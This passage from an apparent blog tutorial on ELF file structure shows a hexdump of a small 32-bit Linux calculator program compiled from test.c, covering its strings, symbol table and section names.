ec 04 57 ff 74 24 2c  |1..........W.t$,|</span><br><span class="line">000012c0  ff 74 24 2c ff 94 b5 f4  fe ff ff 83 c6 01 83 c4  |.t$,............|</span><br><span class="line">000012d0  10 39 f3 75 e3 83 c4 0c  5b 5e 5f 5d c3 8d 76 00  |.9.u....[^_]..v.|</span><br><span class="line">000012e0  c3 8b 2c 24 c3 00 00 00  53 83 ec 08 e8 bf fd ff  |..,$....S.......|</span><br><span class="line">000012f0  ff 81 c3 0f 2d 00 00 83  c4 08 5b c3 00 00 00 00  |....-.....[.....|</span><br><span class="line">00001300  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002000  03 00 00 00 01 00 02 00  6e 75 6d 31 2b 6e 75 6d  |........num1+num|</span><br><span class="line">00002010  32 20 3d 20 25 64 0a 00  50 6c 65 61 73 65 20 69  |2 = %d..Please i|</span><br><span class="line">00002020  6e 70 75 74 20 74 68 65  20 74 77 6f 20 6e 75 6d  |nput the two num|</span><br><span class="line">00002030  62 65 72 20 74 68 61 74  20 79 6f 75 20 77 61 6e  |ber that you wan|</span><br><span class="line">00002040  74 20 74 6f 20 61 64 64  3a 00 25 64 25 64 00 59  |t to add:.%d%d.Y|</span><br><span class="line">00002050  6f 75 72 20 69 6e 70 75  74 20 69 73 3a 25 64 20  |our input is:%d |</span><br><span class="line">00002060  61 6e 64 20 25 64 0a 00  43 61 6c 63 75 6c 61 74  |and %d..Calculat|</span><br><span class="line">00002070  65 72 20 69 73 20 45 4e  44 2e 00 00 01 1b 03 3b  |er is END......;|</span><br><span class="line">00002080  50 00 00 00 09 00 00 00  a4 ef ff ff 98 00 00 00  |P...............|</span><br><span class="line">00002090  e4 ef ff ff bc 00 00 00  f4 ef ff ff 6c 00 00 00  |............l...|</span><br><span class="line">000020a0  2d f1 ff ff d0 00 00 00  66 f1 ff ff f4 00 00 00  |-.......f.......|</span><br><span class="line">000020b0  fd f1 ff ff 28 01 00 00  04 f2 ff ff 3c 01 00 00  |....(.......&lt;...|</span><br><span class="line">000020c0  64 f2 ff ff 88 01 00 00  65 f2 ff ff 9c 01 00 00  |d.......e.......|</span><br><span class="line">000020d0  14 00 00 00 00 00 00 00  01 7a 52 00 01 7c 08 01  |.........zR..|..|</span><br><span class="line">000020e0  1b 0c 04 04 88 01 07 08  10 00 00 00 1c 00 00 00  |................|</span><br><span class="line">000020f0  80 ef ff ff 36 00 00 00  00 00 00 00 14 00 00 00  |....6...........|</span><br><span class="line">00002100  00 00 00 00 01 7a 52 00  01 7c 08 01 1b 0c 04 04  |.....zR..|......|</span><br><span class="line">00002110  88 01 00 00 20 00 00 00  1c 00 00 00 04 ef ff ff  |.... ...........|</span><br><span class="line">00002120  40 00 00 00 00 0e 08 46  0e 0c 4a 0f 0b 74 04 78  |@......F..J..t.x|</span><br><span class="line">00002130  00 3f 1a 3b 2a 32 24 22  10 00 00 00 40 00 00 00  |.?.;*2$&quot;....@...|</span><br><span class="line">00002140  20 ef ff ff 08 00 00 00  00 00 00 00 20 00 00 00  | ........... ...|</span><br><span class="line">00002150  54 00 00 00 55 f0 ff ff  39 00 00 00 00 41 0e 08  |T...U...9....A..|</span><br><span class="line">00002160  85 02 42 0d 05 44 83 03  71 c5 c3 0c 04 04 00 00  |..B..D..q.......|</span><br><span class="line">00002170  30 00 00 00 78 00 00 00  6a f0 ff ff 97 00 00 00  |0...x...j.......|</span><br><span class="line">00002180  00 44 0c 01 00 47 10 05  02 75 00 44 0f 03 75 78  |.D...G...u.D..ux|</span><br><span class="line">00002190  06 10 03 02 75 7c 02 82  c1 0c 01 00 41 c3 41 c5  |....u|......A.A.|</span><br><span class="line">000021a0  43 0c 04 04 10 00 00 00  ac 00 00 00 cd f0 ff ff  |C...............|</span><br><span class="line">000021b0  04 00 00 00 00 00 00 00  48 00 00 00 c0 00 00 00  |........H.......|</span><br><span class="line">000021c0  c0 f0 ff ff 5d 00 00 00  00 41 0e 08 85 02 4c 0e  |....]....A....L.|</span><br><span class="line">000021d0  0c 87 03 41 0e 10 86 04  41 0e 14 83 05 43 0e 20  |...A....A....C. |</span><br><span class="line">000021e0  69 0e 24 41 0e 28 44 0e  2c 44 0e 30 4d 0e 20 47  |i.$A.(D.,D.0M. G|</span><br><span class="line">000021f0  0e 14 41 c3 0e 10 41 c6  0e 0c 41 c7 0e 08 41 c5  |..A...A...A...A.|</span><br><span class="line">00002200  0e 04 00 00 10 00 00 00  0c 01 00 00 d4 f0 ff ff  |................|</span><br><span class="line">00002210  01 00 00 00 00 00 00 00  10 00 00 00 20 01 00 00  |............ ...|</span><br><span class="line">00002220  c1 f0 ff ff 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ef0  00 00 00 00 a0 11 00 00  50 11 00 00 01 00 00 00  |........P.......|</span><br><span class="line">00002f00  47 00 00 00 0c 00 00 00  00 10 00 00 0d 00 00 00  |G...............|</span><br><span class="line">00002f10  e8 12 00 00 19 00 00 00  f4 3e 00 00 1b 00 00 00  |.........&gt;......|</span><br><span class="line">00002f20  04 00 00 00 1a 00 00 00  f8 3e 00 00 1c 00 00 00  |.........&gt;......|</span><br><span class="line">00002f30  04 00 00 00 f5 fe ff 6f  ec 01 00 00 05 00 00 00  |.......o........|</span><br><span class="line">00002f40  9c 02 00 00 06 00 00 00  0c 02 00 00 0a 00 00 00  |................|</span><br><span class="line">00002f50  b6 00 00 00 0b 00 00 00  10 00 00 00 15 00 00 00  |................|</span><br><span class="line">00002f60  00 00 00 00 03 00 00 00  00 40 00 00 02 00 00 00  |.........@......|</span><br><span class="line">00002f70  18 00 00 00 14 00 00 00  11 00 00 00 17 00 00 00  |................|</span><br><span class="line">00002f80  e4 03 00 00 11 00 00 00  a4 03 00 00 12 00 00 00  |................|</span><br><span class="line">00002f90  40 00 00 00 13 00 00 00  08 00 00 00 fb ff ff 6f  |@..............o|</span><br><span class="line">00002fa0  00 00 00 08 fe ff ff 6f  64 03 00 00 ff ff ff 6f  |.......od......o|</span><br><span class="line">00002fb0  01 00 00 00 f0 ff ff 6f  52 03 00 00 fa ff ff 6f  |.......oR......o|</span><br><span class="line">00002fc0  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002fd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ff0  00 00 00 00 00 00 00 00  e2 11 00 00 00 00 00 00  |................|</span><br><span class="line">00003000  fc 3e 00 00 00 00 00 00  00 00 00 00 36 10 00 00  |.&gt;..........6...|</span><br><span class="line">00003010  46 10 00 00 56 10 00 00  00 00 00 00 1c 40 00 00  |F...V........@..|</span><br><span class="line">00003020  47 43 43 3a 20 28 44 65  62 69 61 6e 20 31 30 2e  |GCC: (Debian 10.|</span><br><span class="line">00003030  32 2e 30 2d 35 29 20 31  30 2e 32 2e 30 00 00 00  |2.0-5) 10.2.0...|</span><br><span class="line">00003040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003050  00 00 00 00 94 01 00 00  00 00 00 00 03 00 01 00  |................|</span><br><span class="line">00003060  00 00 00 00 a8 01 00 00  00 00 00 00 03 00 02 00  |................|</span><br><span class="line">00003070  00 00 00 00 cc 01 00 00  00 00 00 00 03 00 03 00  |................|</span><br><span class="line">00003080  00 00 00 00 ec 01 00 00  00 00 00 00 03 00 04 00  |................|</span><br><span class="line">00003090  00 00 00 00 0c 02 00 00  00 00 00 00 03 00 05 00  |................|</span><br><span class="line">000030a0  00 00 00 00 9c 02 00 00  00 00 00 00 03 00 06 00  |................|</span><br><span class="line">000030b0  00 00 00 00 52 03 00 00  00 00 00 00 03 00 07 00  |....R...........|</span><br><span class="line">000030c0  00 00 00 00 64 03 00 00  00 00 00 00 03 00 08 00  |....d...........|</span><br><span class="line">000030d0  00 00 00 00 a4 03 00 00  00 00 00 00 03 00 09 00  |................|</span><br><span class="line">000030e0  00 00 00 00 e4 03 00 00  00 00 00 00 03 00 0a 00  |................|</span><br><span class="line">000030f0  00 00 00 00 00 10 00 00  00 00 00 00 03 00 0b 00  |................|</span><br><span class="line">00003100  00 00 00 00 20 10 00 00  00 00 00 00 03 00 0c 00  |.... ...........|</span><br><span class="line">00003110  00 00 00 00 60 10 00 00  00 00 00 00 03 00 0d 00  |....`...........|</span><br><span class="line">00003120  00 00 00 00 70 10 00 00  00 00 00 00 03 00 0e 00  |....p...........|</span><br><span class="line">00003130  00 00 00 00 e8 12 00 00  00 00 00 00 03 00 0f 00  |................|</span><br><span class="line">00003140  00 00 00 00 00 20 00 00  00 00 00 00 03 00 10 00  |..... ..........|</span><br><span class="line">00003150  00 00 00 00 7c 20 00 00  00 00 00 00 03 00 11 00  |....| ..........|</span><br><span class="line">00003160  00 00 00 00 d0 20 00 00  00 00 00 00 03 00 12 00  |..... ..........|</span><br><span class="line">00003170  00 00 00 00 f4 3e 00 00  00 00 00 00 03 00 13 00  |.....&gt;..........|</span><br><span class="line">00003180  00 00 00 00 f8 3e 00 00  00 00 00 00 03 00 14 00  |.....&gt;..........|</span><br><span class="line">00003190  00 00 00 00 fc 3e 00 00  00 00 00 00 03 00 15 00  |.....&gt;..........|</span><br><span class="line">000031a0  00 00 00 00 ec 3f 00 00  00 00 00 00 03 00 16 00  |.....?..........|</span><br><span class="line">000031b0  00 00 00 00 00 40 00 00  00 00 00 00 03 00 17 00  |.....@..........|</span><br><span class="line">000031c0  00 00 00 00 18 40 00 00  00 00 00 00 03 00 18 00  |.....@..........|</span><br><span class="line">000031d0  00 00 00 00 20 40 00 00  00 00 00 00 03 00 19 00  |.... @..........|</span><br><span class="line">000031e0  00 00 00 00 00 00 00 00  00 00 00 00 03 00 1a 00  |................|</span><br><span class="line">000031f0  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003200  0c 00 00 00 c0 10 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003210  0e 00 00 00 00 11 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003220  21 00 00 00 50 11 00 00  00 00 00 00 02 00 0e 00  |!...P...........|</span><br><span class="line">00003230  37 00 00 00 20 40 00 00  01 00 00 00 01 00 19 00  |7... @..........|</span><br><span class="line">00003240  43 00 00 00 f8 3e 00 00  00 00 00 00 01 00 14 00  |C....&gt;..........|</span><br><span class="line">00003250  6a 00 00 00 a0 11 00 00  00 00 00 00 02 00 0e 00  |j...............|</span><br><span class="line">00003260  76 00 00 00 f4 3e 00 00  00 00 00 00 01 00 13 00  |v....&gt;..........|</span><br><span class="line">00003270  95 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003280  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003290  9c 00 00 00 2c 22 00 00  00 00 00 00 01 00 12 00  |....,&quot;..........|</span><br><span class="line">000032a0  00 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">000032b0  aa 00 00 00 f8 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032c0  bb 00 00 00 fc 3e 00 00  00 00 00 00 01 00 15 00  |.....&gt;..........|</span><br><span class="line">000032d0  c4 00 00 00 f4 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032e0  d7 00 00 00 7c 20 00 00  00 00 00 00 00 00 11 00  |....| ..........|</span><br><span class="line">000032f0  ea 00 00 00 00 40 00 00  00 00 00 00 01 00 17 00  |.....@..........|</span><br><span class="line">00003300  06 02 00 00 00 10 00 00  00 00 00 00 02 00 0b 00  |................|</span><br><span class="line">00003310  00 01 00 00 e0 12 00 00  01 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003320  10 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003330  2c 01 00 00 b0 10 00 00  04 00 00 00 12 02 0e 00  |,...............|</span><br><span class="line">00003340  a9 01 00 00 18 40 00 00  00 00 00 00 20 00 18 00  |.....@...... ...|</span><br><span class="line">00003350  42 01 00 00 a9 11 00 00  39 00 00 00 12 00 0e 00  |B.......9.......|</span><br><span class="line">00003360  46 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |F...............|</span><br><span class="line">00003370  58 01 00 00 e1 12 00 00  00 00 00 00 12 02 0e 00  |X...............|</span><br><span class="line">00003380  6e 01 00 00 20 40 00 00  00 00 00 00 10 00 18 00  |n... @..........|</span><br><span class="line">00003390  0a 01 00 00 e8 12 00 00  00 00 00 00 12 02 0f 00  |................|</span><br><span class="line">000033a0  75 01 00 00 a5 11 00 00  00 00 00 00 12 02 0e 00  |u...............|</span><br><span class="line">000033b0  8b 01 00 00 00 00 00 00  00 00 00 00 22 00 00 00  |............&quot;...|</span><br><span class="line">000033c0  a7 01 00 00 18 40 00 00  00 00 00 00 10 00 18 00  |.....@..........|</span><br><span class="line">000033d0  b4 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000033e0  c3 01 00 00 1c 40 00 00  00 00 00 00 11 02 18 00  |.....@..........|</span><br><span class="line">000033f0  d0 01 00 00 04 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003400  df 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |................|</span><br><span class="line">00003410  fc 01 00 00 80 12 00 00  5d 00 00 00 12 00 0e 00  |........].......|</span><br><span class="line">00003420  b6 00 00 00 24 40 00 00  00 00 00 00 10 00 19 00  |....$@..........|</span><br><span class="line">00003430  ad 01 00 00 70 10 00 00  36 00 00 00 12 00 0e 00  |....p...6.......|</span><br><span class="line">00003440  0c 02 00 00 00 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003450  13 02 00 00 20 40 00 00  00 00 00 00 10 00 19 00  |.... @..........|</span><br><span class="line">00003460  1f 02 00 00 e2 11 00 00  97 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003470  24 02 00 00 79 12 00 00  00 00 00 00 12 02 0e 00  |$...y...........|</span><br><span class="line">00003480  3a 02 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |:...............|</span><br><span class="line">00003490  54 02 00 00 20 40 00 00  00 00 00 00 11 02 18 00  |T... @..........|</span><br><span class="line">000034a0  60 02 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |`........... ...|</span><br><span class="line">000034b0  00 63 72 74 73 74 75 66  66 2e 63 00 64 65 72 65  |.crtstuff.c.dere|</span><br><span class="line">000034c0  67 69 73 74 65 72 5f 74  6d 5f 63 6c 6f 6e 65 73  |gister_tm_clones|</span><br><span class="line">000034d0  00 5f 5f 64 6f 5f 67 6c  6f 62 61 6c 5f 64 74 6f  |.__do_global_dto|</span><br><span class="line">000034e0  72 73 5f 61 75 78 00 63  6f 6d 70 6c 65 74 65 64  |rs_aux.completed|</span><br><span class="line">000034f0  2e 30 00 5f 5f 64 6f 5f  67 6c 6f 62 61 6c 5f 64  |.0.__do_global_d|</span><br><span class="line">00003500  74 6f 72 73 5f 61 75 78  5f 66 69 6e 69 5f 61 72  |tors_aux_fini_ar|</span><br><span class="line">00003510  72 61 79 5f 65 6e 74 72  79 00 66 72 61 6d 65 5f  |ray_entry.frame_|</span><br><span class="line">00003520  64 75 6d 6d 79 00 5f 5f  66 72 61 6d 65 5f 64 75  |dummy.__frame_du|</span><br><span class="line">00003530  6d 6d 79 5f 69 6e 69 74  5f 61 72 72 61 79 5f 65  |mmy_init_array_e|</span><br><span class="line">00003540  6e 74 72 79 00 74 65 73  74 2e 63 00 5f 5f 46 52  |ntry.test.c.__FR|</span><br><span class="line">00003550  41 4d 45 5f 45 4e 44 5f  5f 00 5f 5f 69 6e 69 74  |AME_END__.__init|</span><br><span class="line">00003560  5f 61 72 72 61 79 5f 65  6e 64 00 5f 44 59 4e 41  |_array_end._DYNA|</span><br><span class="line">00003570  4d 49 43 00 5f 5f 69 6e  69 74 5f 61 72 72 61 79  |MIC.__init_array|</span><br><span class="line">00003580  5f 73 74 61 72 74 00 5f  5f 47 4e 55 5f 45 48 5f  |_start.__GNU_EH_|</span><br><span class="line">00003590  46 52 41 4d 45 5f 48 44  52 00 5f 47 4c 4f 42 41  |FRAME_HDR._GLOBA|</span><br><span class="line">000035a0  4c 5f 4f 46 46 53 45 54  5f 54 41 42 4c 45 5f 00  |L_OFFSET_TABLE_.|</span><br><span class="line">000035b0  5f 5f 6c 69 62 63 5f 63  73 75 5f 66 69 6e 69 00  |__libc_csu_fini.|</span><br><span class="line">000035c0  5f 49 54 4d 5f 64 65 72  65 67 69 73 74 65 72 54  |_ITM_deregisterT|</span><br><span class="line">000035d0  4d 43 6c 6f 6e 65 54 61  62 6c 65 00 5f 5f 78 38  |MCloneTable.__x8|</span><br><span class="line">000035e0  36 2e 67 65 74 5f 70 63  5f 74 68 75 6e 6b 2e 62  |6.get_pc_thunk.b|</span><br><span class="line">000035f0  78 00 61 64 64 00 70 72  69 6e 74 66 40 40 47 4c  |x.add.printf@@GL|</span><br><span class="line">00003600  49 42 43 5f 32 2e 30 00  5f 5f 78 38 36 2e 67 65  |IBC_2.0.__x86.ge|</span><br><span class="line">00003610  74 5f 70 63 5f 74 68 75  6e 6b 2e 62 70 00 5f 65  |t_pc_thunk.bp._e|</span><br><span class="line">00003620  64 61 74 61 00 5f 5f 78  38 36 2e 67 65 74 5f 70  |data.__x86.get_p|</span><br><span class="line">00003630  63 5f 74 68 75 6e 6b 2e  64 78 00 5f 5f 63 78 61  |c_thunk.dx.__cxa|</span><br><span class="line">00003640  5f 66 69 6e 61 6c 69 7a  65 40 40 47 4c 49 42 43  |_finalize@@GLIBC|</span><br><span class="line">00003650  5f 32 2e 31 2e 33 00 5f  5f 64 61 74 61 5f 73 74  |_2.1.3.__data_st|</span><br><span class="line">00003660  61 72 74 00 5f 5f 67 6d  6f 6e 5f 73 74 61 72 74  |art.__gmon_start|</span><br><span class="line">00003670  5f 5f 00 5f 5f 64 73 6f  5f 68 61 6e 64 6c 65 00  |__.__dso_handle.|</span><br><span class="line">00003680  5f 49 4f 5f 73 74 64 69  6e 5f 75 73 65 64 00 5f  |_IO_stdin_used._|</span><br><span class="line">00003690  5f 6c 69 62 63 5f 73 74  61 72 74 5f 6d 61 69 6e  |_libc_start_main|</span><br><span class="line">000036a0  40 40 47 4c 49 42 43 5f  32 2e 30 00 5f 5f 6c 69  |@@GLIBC_2.0.__li|</span><br><span class="line">000036b0  62 63 5f 63 73 75 5f 69  6e 69 74 00 5f 66 70 5f  |bc_csu_init._fp_|</span><br><span class="line">000036c0  68 77 00 5f 5f 62 73 73  5f 73 74 61 72 74 00 6d  |hw.__bss_start.m|</span><br><span class="line">000036d0  61 69 6e 00 5f 5f 78 38  36 2e 67 65 74 5f 70 63  |ain.__x86.get_pc|</span><br><span class="line">000036e0  5f 74 68 75 6e 6b 2e 61  78 00 5f 5f 69 73 6f 63  |_thunk.ax.__isoc|</span><br><span class="line">000036f0  39 39 5f 73 63 61 6e 66  40 40 47 4c 49 42 43 5f  |99_scanf@@GLIBC_|</span><br><span class="line">00003700  32 2e 37 00 5f 5f 54 4d  43 5f 45 4e 44 5f 5f 00  |2.7.__TMC_END__.|</span><br><span class="line">00003710  5f 49 54 4d 5f 72 65 67  69 73 74 65 72 54 4d 43  |_ITM_registerTMC|</span><br><span class="line">00003720  6c 6f 6e 65 54 61 62 6c  65 00 00 2e 73 79 6d 74  |loneTable...symt|</span><br><span class="line">00003730  61 62 00 2e 73 74 72 74  61 62 00 2e 73 68 73 74  |ab..strtab..shst|</span><br><span class="line">00003740  72 74 61 62 00 2e 69 6e  74 65 72 70 00 2e 6e 6f  |rtab..interp..no|</span><br><span class="line">00003750  74 65 2e 67 6e 75 2e 62  75 69 6c 64 2d 69 64 00  |te.gnu.build-id.|</span><br><span class="line">00003760  2e 6e 6f 74 65 2e 41 42  49 2d 74 61 67 00 2e 67  |.note.ABI-tag..g|</span><br><span class="line">00003770  6e 75 2e 68 61 73 68 00  2e 64 79 6e 73 79 6d 00  |nu.hash..dynsym.|</span><br><span class="line">00003780  2e 64 79 6e 73 74 72 00  2e 67 6e 75 2e 76 65 72  |.dynstr..gnu.ver|</span><br><span class="line">00003790  73 69 6f 6e 00 2e 67 6e  75 2e 76 65 72 73 69 6f  |sion..gnu.versio|</span><br><span class="line">000037a0  6e 5f 72 00 2e 72 65 6c  2e 64 79 6e 00 2e 72 65  |n_r..rel.dyn..re|</span><br><span class="line">000037b0  6c 2e 70 6c 74 00 2e 69  6e 69 74 00 2e 70 6c 74  |l.plt..init..plt|</span><br><span class="line">000037c0  2e 67 6f 74 00 2e 74 65  78 74 00 2e 66 69 6e 69  |.got..text..fini|</span><br><span class="line">000037d0  00 2e 72 6f 64 61 74 61  00 2e 65 68 5f 66 72 61  |..rodata..eh_fra|</span><br><span class="line">000037e0  6d 65 5f 68 64 72 00 2e  65 68 5f 66 72 61 6d 65  |me_hdr..eh_frame|</span><br><span class="line">000037f0  00 2e 69 6e 69 74 5f 61  72 72 61 79 00 2e 66 69  |..init_array..fi|</span><br><span class="line">00003800  6e 69 5f 61 72 72 61 79  00 2e 64 79 6e 61 6d 69  |ni_array..dynami|</span><br><span class="line">00003810  63 00 2e 67 6f 74 2e 70  6c 74 00 2e 64 61 74 61  |c..got.plt..data|</span><br><span class="line">00003820  00 2e 62 73 73 00 2e 63  6f 6d 6d 65 6e 74 00 00  |..bss..comment..|</span><br><span class="line">00003830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00003850  00 00 00 00 00 00 00 00  1b 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003860  02 00 00 00 94 01 00 00  94 01 00 00 13 00 00 00  |................|</span><br><span class="line">00003870  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003880  23 00 00 00 07 00 00 00  02 00 00 00 a8 01 00 00  |#...............|</span><br><span class="line">00003890  a8 01 00 00 24 00 00 00  00 00 00 00 00 00 00 00  |....$...........|</span><br><span class="line">000038a0  04 00 00 00 00 00 00 00  36 00 00 00 07 00 00 00  |........6.......|</span><br><span class="line">000038b0  02 00 00 00 cc 01 00 00  cc 01 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000038c0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">000038d0  44 00 00 00 f6 ff ff 6f  02 00 00 00 ec 01 00 00  |D......o........|</span><br><span class="line">000038e0  ec 01 00 00 20 00 00 00  05 00 00 00 00 00 00 00  |.... ...........|</span><br><span class="line">000038f0  04 00 00 00 04 00 00 00  4e 00 00 00 0b 00 00 00  |........N.......|</span><br><span class="line">00003900  02 00 00 00 0c 02 00 00  0c 02 00 00 90 00 00 00  |................|</span><br><span class="line">00003910  06 00 00 00 01 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00003920  56 00 00 00 03 00 00 00  02 00 00 00 9c 02 00 00  |V...............|</span><br><span class="line">00003930  9c 02 00 00 b6 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003940  01 00 00 00 00 00 00 00  5e 00 00 00 ff ff ff 6f  |........^......o|</span><br><span class="line">00003950  02 00 00 00 52 03 00 00  52 03 00 00 12 00 00 00  |....R...R.......|</span><br><span class="line">00003960  05 00 00 00 00 00 00 00  02 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003970  6b 00 00 00 fe ff ff 6f  02 00 00 00 64 03 00 00  |k......o....d...|</span><br><span class="line">00003980  64 03 00 00 40 00 00 00  06 00 00 00 01 00 00 00  |d...@...........|</span><br><span class="line">00003990  04 00 00 00 00 00 00 00  7a 00 00 00 09 00 00 00  |........z.......|</span><br><span class="line">000039a0  02 00 00 00 a4 03 00 00  a4 03 00 00 40 00 00 00  |............@...|</span><br><span class="line">000039b0  05 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000039c0  83 00 00 00 09 00 00 00  42 00 00 00 e4 03 00 00  |........B.......|</span><br><span class="line">000039d0  e4 03 00 00 18 00 00 00  05 00 00 00 17 00 00 00  |................|</span><br><span class="line">000039e0  04 00 00 00 08 00 00 00  8c 00 00 00 01 00 00 00  |................|</span><br><span class="line">000039f0  06 00 00 00 00 10 00 00  00 10 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003a00  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003a10  87 00 00 00 01 00 00 00  06 00 00 00 20 10 00 00  |............ ...|</span><br><span class="line">00003a20  20 10 00 00 40 00 00 00  00 00 00 00 00 00 00 00  | ...@...........|</span><br><span class="line">00003a30  10 00 00 00 04 00 00 00  92 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a40  06 00 00 00 60 10 00 00  60 10 00 00 08 00 00 00  |....`...`.......|</span><br><span class="line">00003a50  00 00 00 00 00 00 00 00  08 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003a60  9b 00 00 00 01 00 00 00  06 00 00 00 70 10 00 00  |............p...|</span><br><span class="line">00003a70  70 10 00 00 75 02 00 00  00 00 00 00 00 00 00 00  |p...u...........|</span><br><span class="line">00003a80  10 00 00 00 00 00 00 00  a1 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a90  06 00 00 00 e8 12 00 00  e8 12 00 00 14 00 00 00  |................|</span><br><span class="line">00003aa0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ab0  a7 00 00 00 01 00 00 00  02 00 00 00 00 20 00 00  |............. ..|</span><br><span class="line">00003ac0  00 20 00 00 7b 00 00 00  00 00 00 00 00 00 00 00  |. ..&#123;...........|</span><br><span class="line">00003ad0  04 00 00 00 00 00 00 00  af 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003ae0  02 00 00 00 7c 20 00 00  7c 20 00 00 54 00 00 00  |....| ..| ..T...|</span><br><span class="line">00003af0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b00  bd 00 00 00 01 00 00 00  02 00 00 00 d0 20 00 00  |............. ..|</span><br><span class="line">00003b10  d0 20 00 00 60 01 00 00  00 00 00 00 00 00 00 00  |. ..`...........|</span><br><span class="line">00003b20  04 00 00 00 00 00 00 00  c7 00 00 00 0e 00 00 00  |................|</span><br><span class="line">00003b30  03 00 00 00 f4 3e 00 00  f4 2e 00 00 04 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b40  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003b50  d3 00 00 00 0f 00 00 00  03 00 00 00 f8 3e 00 00  |.............&gt;..|</span><br><span class="line">00003b60  f8 2e 00 00 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b70  04 00 00 00 04 00 00 00  df 00 00 00 06 00 00 00  |................|</span><br><span class="line">00003b80  03 00 00 00 fc 3e 00 00  fc 2e 00 00 f0 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b90  06 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003ba0  96 00 00 00 01 00 00 00  03 00 00 00 ec 3f 00 00  |.............?..|</span><br><span class="line">00003bb0  ec 2f 00 00 14 00 00 00  00 00 00 00 00 00 00 00  |./..............|</span><br><span class="line">00003bc0  04 00 00 00 04 00 00 00  e8 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003bd0  03 00 00 00 00 40 00 00  00 30 00 00 18 00 00 00  |.....@...0......|</span><br><span class="line">00003be0  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003bf0  f1 00 00 00 01 00 00 00  03 00 00 00 18 40 00 00  |.............@..|</span><br><span class="line">00003c00  18 30 00 00 08 00 00 00  00 00 00 00 00 00 00 00  |.0..............|</span><br><span class="line">00003c10  04 00 00 00 00 00 00 00  f7 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003c20  03 00 00 00 20 40 00 00  20 30 00 00 04 00 00 00  |.... @.. 0......|</span><br><span class="line">00003c30  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003c40  fc 00 00 00 01 00 00 00  30 00 00 00 00 00 00 00  |........0.......|</span><br><span class="line">00003c50  20 30 00 00 1e 00 00 00  00 00 00 00 00 00 00 00  | 0..............|</span><br><span class="line">00003c60  01 00 00 00 01 00 00 00  01 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003c70  00 00 00 00 00 00 00 00  40 30 00 00 70 04 00 00  |........@0..p...|</span><br><span class="line">00003c80  1c 00 00 00 2d 00 00 00  04 00 00 00 10 00 00 00  |....-...........|</span><br><span class="line">00003c90  09 00 00 00 03 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ca0  b0 34 00 00 7a 02 00 00  00 00 00 00 00 00 00 00  |.4..z...........|</span><br><span class="line">00003cb0  01 00 00 00 00 00 00 00  11 00 00 00 03 00 00 00  |................|</span><br><span class="line">00003cc0  00 00 00 00 00 00 00 00  2a 37 00 00 05 01 00 00  |........*7......|</span><br><span class="line">00003cd0  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ce0</span><br></pre></td></tr></table></figure><h2 id="0x02-ELF文件的结构"><a href="#0x02-ELF文件的结构" class="headerlink" title="0x02.ELF文件的结构"></a><font 